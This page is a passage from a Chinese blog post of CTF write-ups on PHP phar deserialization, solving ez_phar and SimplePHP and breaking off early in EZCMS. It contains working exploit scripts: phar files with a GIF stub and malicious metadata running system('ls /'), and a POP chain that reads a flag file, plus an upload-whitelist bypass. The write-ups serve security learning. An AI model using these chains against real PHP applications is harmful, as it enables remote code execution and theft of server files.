<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="phar反序列化攻击专题。在字节跳动出的那题涉及到了hash扩展长度攻击和函数的trick；这题有复现出来。在南邮的那题涉及到了通过ssrf进行内网探测和PHP-FPM未授权访问漏洞；因为题目环境问题还有自身能力问题占时无法全部复现(对内网探测和内网攻击还一窍不通)">
<meta property="og:type" content="article">
<meta property="og:title" content="pop链之phar反序列化">
<meta property="og:url" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="hey&#39;s blog">
<meta property="og:description" content="phar反序列化攻击专题。在字节跳动出的那题涉及到了hash扩展长度攻击和函数的trick；这题有复现出来。在南邮的那题涉及到了通过ssrf进行内网探测和PHP-FPM未授权访问漏洞；因为题目环境问题还有自身能力问题占时无法全部复现(对内网探测和内网攻击还一窍不通)">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/29.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/28.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/27.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/21.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/25.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/22.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/23.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/26.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/30.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/31.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/31.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/30.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/32.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/33.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/34.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/35.png">
<meta property="article:published_time" content="2023-06-26T11:13:38.000Z">
<meta property="article:modified_time" content="2023-06-29T10:13:42.370Z">
<meta property="article:author" content="hey">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/29.png"><title>pop链之phar反序列化 | hey's blog</title><link ref="canonical" href="https://hyggevv.github.io/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">About</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">menu.read</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">hey's blog</div><div class="header-banner-info__subtitle">天气转晴太阳崭新我在前进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">pop链之phar反序列化</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-06-26</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-06-29</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">Visited</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
        <h1 id="HNCTF-2022-WEEK3-ez-phar">
          <a href="#HNCTF-2022-WEEK3-ez-phar" class="heading-link"><i class="fas fa-link"></i></a><a href="#HNCTF-2022-WEEK3-ez-phar" class="headerlink" title="[HNCTF 2022 WEEK3]ez_phar"></a>[HNCTF 2022 WEEK3]ez_phar</h1>
      
        <h2 id="0x01-信息收集">
          <a href="#0x01-信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2>
      <p>此时根据界面提醒的upload something upload something；此时我们可以怀疑存在文件上传的界面；此时我们访问upload.php得到文件上传的界面，然后又根<br>据此时存在一个get提交的filename和Flag类的_destruct()；此时有理由怀疑此题的考点在于phar反序列化<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/29.png"></p>

        <h2 id="0x02-phar反序列化攻击">
          <a href="#0x02-phar反序列化攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x02-phar反序列化攻击" class="headerlink" title="0x02 phar反序列化攻击"></a>0x02 phar反序列化攻击</h2>
      <p>exp</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag</span><br><span class="line">&#123;</span><br><span class="line">    public $code;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Flag();</span><br><span class="line">$a -&gt; code=&quot;system(&#x27;ls /&#x27;);&quot;;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;hey.phar&quot;); //对phar对象进行实例化，以便后续操作。</span><br><span class="line">$phar-&gt;startBuffering(); //缓冲phar写操作（不用特别注意）</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，为固定格式</span><br><span class="line">$phar-&gt;setMetaData($a); //把我们的对象写进Metadata中</span><br><span class="line">$phar-&gt;addFromString(&quot;test1.txt&quot;,&quot;test1&quot;); //写压缩文件的内容，这里没利用点，可以随便写</span><br><span class="line">$phar-&gt;stopBuffering(); //停止缓冲</span><br></pre></td></tr></table></div></figure>
<p>上传完之后使用phar:&#x2F;&#x2F;进行读取即可获取flag<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/28.png"></p>

        <h1 id="SWPUCTF-2018-SimplePHP">
          <a href="#SWPUCTF-2018-SimplePHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h1>
      
        <h2 id="0x01-信息收集-1">
          <a href="#0x01-信息收集-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x01-信息收集-1" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2>
      <p><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png"><br>此时发现了这个读取文件的功能，并且在源码中发现了f1ag.php;此时考虑使用伪协议读取f1ag.php;但是无法读取.此时我们先进行一波信息收集,因为存在这个读取文件的功能,所以此时怀疑存在源码信息泄露；此时读一下源码file.php;发现存在回显，先进行源码审计<br>file.php<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png"><br>此时发现了file_exists()和文件上传解密所以有理由怀疑这题的突破点在于phar反序列化攻击；接下来继续读取function.php和class.php<br>function.php<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png"><br>此时在这个function.php中我们可以知道这个是文件上传界面功能的源码，此时自定义了三个函数其中upload_file_do()中对我们上传的文件名做了处理，用md5<br>进行加密；接下来是upload_file_check()，此时定义了一个白名单，只能上传gif、jpeg、jpg、png后缀的文件<br>class.php<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png"></p>

        <h2 id="0x02-class-php代码审计">
          <a href="#0x02-class-php代码审计" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x02-class-php代码审计" class="headerlink" title="0x02 class.php代码审计"></a>0x02 class.php代码审计</h2>
      <p>class.php:<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png"><br>此时的思路依旧跟之前做pop链的思路一致；先分析最后可以输出我们想要内容的函数；然后根据这个链尾反推出整条pop链<br>此时我们先来看Cle4r类：<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png"><br>此时这段代码定义了一个名为Cle4r的类，其中包含了两个属性$test和$str和两个函数，此时在_construct()这个构造函数中接受一个参数$name并且在这个构造<br>函数被调用时会将$name的值赋给$str;然后在_destruct()这个析构函数中，会将$str的值赋给$test;然后使用echo语句输出$test<br>Show类：<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png"><br>此时定义了一个名为Show的类，其中包含了两个属性和五个函数；其中_construct()这个构造函数中接受一个参数$file且在这个魔术魔方被触发时会将$file值赋<br>给$source并且输出$source;接下来是_toString()此时会在$str数组中获取键为str的值并输出;接下来是_set()魔术魔方将$value值赋给$key；最后是_show和_wakeup()魔术魔方,在其被触发时会对$source属性进行一个过滤若$source属性包含http|https|file:|gopher|dict|..|f1ag;则会输出hacker<br>Test类：<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png"><br>此时定义了一个名为Test的类和两个属性和三个函数;此时在_construct()中会初始化params为空数组;在_get()中会调用get()方法;在get()方法中会先判断在pa<br>rams数组中是否存在键为$key的元素;如果存在则会将该值赋值给$value;如果不存在的话将会把$value的值置为index.php;并且调用file_get()方法和返回结结<br>果;最后是file_get();此时会接受一个参数为$value的值并调用file_get_contents()获取$value的内容然后将该内容进行base64加密后输出<br>反推pop链：<br>此时我们从上面的源码审计中可知Test类中的file_get()可以读取$value的内容并返回;所以此时我们将file_get()作为链尾;接下来Test类中的get()会触发file_get();然后Test类的_get()会触发get();而当读取一个不可访问的属性的值或调用一个不存在的函数或属性时会触发_get;此时发现在Show类中的_toString()代<br>码尝试访问 $str 数组的键 ‘str’，并获取其值。接下来，从取得的值中访问属性 ‘source’。最后，将获取到的内容赋值给变量 $content;此时我们只需要把str[‘str’]赋值给Test;在Test中不存在suorce属性；所以此时便可以顺利调用_get();而_toString()的触发条件很容易寻找,在Cle4r类中的_destruct()中的echo<br>可以触发_toString().至此整条pop链已经被捋清(注：此时在Test类中的$key就是source)</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cle4r[__destruct()] --&gt; Show[__toString()] --&gt; Test[__get()] --&gt; Test[get()] --&gt; Test[file_get()]</span><br></pre></td></tr></table></div></figure>
<p>tips:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">通过Cle4r。将str赋值为Show类。</span><br><span class="line">this-&gt;test=$this-&gt;Show类</span><br><span class="line">echo $this-&gt;test;</span><br><span class="line">触发Show类中的__tostring魔术方法。进入Show类。执行</span><br><span class="line">$content=$this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">那么我们将str[&#x27;str&#x27;]赋值为Test类。使其调用source。但是不存在。</span><br><span class="line">接下来就进入了Test类。执行</span><br><span class="line">__get($key)。这个$key。其实就是source。</span><br><span class="line">get($key)</span><br><span class="line">$value=this-&gt;params[&#x27;source&#x27;];</span><br><span class="line">file_get_contents($value);</span><br><span class="line">由于Test类在构造函数中。定义了params是个数组。那么我们就定义params=array(&#x27;source&#x27;=&gt;&#x27;/var/www/html/f1ag.php&#x27;);</span><br></pre></td></tr></table></div></figure>


        <h2 id="0x03-exp编写">
          <a href="#0x03-exp编写" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x03-exp编写" class="headerlink" title="0x03 exp编写"></a>0x03 exp编写</h2>
      <p>pop’s exp:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new C1e4r();</span><br><span class="line">$a -&gt; str = new Show();</span><br><span class="line">$a -&gt; str -&gt; str[&#x27;str&#x27;] = new Test();</span><br><span class="line">$a -&gt; str -&gt; str[&#x27;str&#x27;] -&gt; params = array(&#x27;source&#x27; =&gt; &#x27;/var/www/html/f1ag.php&#x27;);</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
<p>phar’s exp:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">&#125;</span><br><span class="line">$a = new C1e4r();</span><br><span class="line">$a -&gt; str = new Show();</span><br><span class="line">$a -&gt; str -&gt; str[&#x27;str&#x27;] = new Test();</span><br><span class="line">$a -&gt; str -&gt; str[&#x27;str&#x27;] -&gt; params = array(&#x27;source&#x27; =&gt; &#x27;/var/www/html/f1ag.php&#x27;);</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;exp.phar&quot;);</span><br><span class="line">$phar -&gt; startBuffering();</span><br><span class="line">$phar -&gt; setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar -&gt; setMetadata($a);</span><br><span class="line">$phar -&gt; addFromString(&quot;exp.txt&quot;, &quot;success&quot;); //随便写点什么生成个签名</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
<p>此时我们注意注意审计function.php<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png"><br>首先得经过upload_file_check()函数。这个函数是判断文件后缀名的。必须是gif&#x2F;jpeg&#x2F;jpg&#x2F;png通过匹配后。进入upload_file_do()这里就是上传文件了。<br>文件名&#x3D;md5(文件名+IP地址)<br>此时我们将exp.phar改为1.jpg上传;然后访问upload<br>进行查看发现已经上传成功<br>接下来就是利用phar:&#x2F;&#x2F;协议进行读取<br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png"><br>对输出的字符串进行base64解码即可得到flag</p>

        <h1 id="ByteCTF-2019-EZCMS">
          <a href="#ByteCTF-2019-EZCMS" class="heading-link"><i class="fas fa-link"></i></a><a href="#ByteCTF-2019-EZCMS" class="headerlink" title="[ByteCTF 2019]EZCMS"></a>[ByteCTF 2019]EZCMS</h1>
      
        <h2 id="0x01-信息收集-2">
          <a href="#0x01-信息收集-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x01-信息收集-2" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2>
      <p>此时依旧是给了我们一个登入框，此时我们使用admin&#x2F;admin123弱口令进入后发现了一个文件上传的界面；但是此时我们上传一个图片时发现提示我们不是admin,<br>接下来继续观察发现了一个.&#x2F;htaccess;此时有点山穷水尽的感觉,此时我们掏出我们的dirsearch进行一个目录的扫描看看是否存在信息泄露;经过扫描之后果然发现了网站源码的泄露<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://www.zip/">www.zip</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><img src="/2023/06/26/pop%E9%93%BE%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/27.png"></p>

        <h2 id="0x02-代码审计">
          <a href="#0x02-代码审计" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h2>
      
        <h3 id="index-php">
          <a href="#index-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3>
